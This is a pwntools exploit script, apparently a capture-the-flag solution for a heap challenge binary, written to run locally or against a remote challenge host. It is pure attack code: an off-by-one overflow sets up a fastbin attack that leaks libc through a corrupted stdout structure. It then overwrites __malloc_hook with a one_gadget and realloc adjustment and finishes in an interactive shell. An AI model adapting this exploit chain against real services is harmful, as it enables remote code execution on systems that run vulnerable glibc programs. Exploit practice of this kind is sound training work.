#coding=utf-8
from pwn import *

context(arch="amd64", os="linux")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

ip = 'redirect.do-not-trust.hacking.run'
port = '10471'
reomote_addr = [ip,port]
binary = './pwn1'

libc = ELF('./libc.so.6')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)

if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
    addr = u64(p.recvuntil('\x7e')[-6:].ljust(8,'\x00'))
    base = addr - offset
    print "[+]libc_base=>"+hex(base)
    return base

def add(index,size):
    sla(">> \n",'1')
    sla("input index:\n",str(index))
    sla("input size:\n",str(size))
def free(index):
    sla(">> \n",'2')
    sla("input index:\n",str(index))
def edit(index,context):
    sla(">> \n",'3')
    sla("input index:\n",str(index))
    sla("input context:\n",context)
def gift():
    sla(">> \n",'666')
    

gift()
stdout = int(rv(8),16) + 0xc04620 - 0x894810

add(0,0x28)
add(1,0x30)
add(2,0x60)
add(3,0x20)
edit(0,'a'*0x28+'\xb1')
free(1)
free(2)
add(4,0x30)
edit(2,p64(stdout-0x43)[0:2])
add(5,0x60)
add(6,0x60)
edit(6,'a'*3+p64(0) * 6 + p64(0xfbad1877) + p64(0) * 3 + '\x58')

libc_base=u64(rv(6).ljust(8,b'\x00'))-131-libc.sym['_IO_2_1_stdout_']
free_hook=libc_base+libc.sym['__free_hook']

system = libc_base+libc.sym['system']
malloc_hook = libc_base+libc.sym['__malloc_hook']
one_gadget = libc_base + 0x4527a
realloc = libc_base+libc.sym['realloc']

add(7,0x60)
add(8,0x60)
free(8)
edit(8,p64(malloc_hook-0x23))
add(0,0x60)
add(1,0x60)
edit(1,'a'*11 + p64(one_gadget) + p64(realloc+13))

add(2,0x20)

it()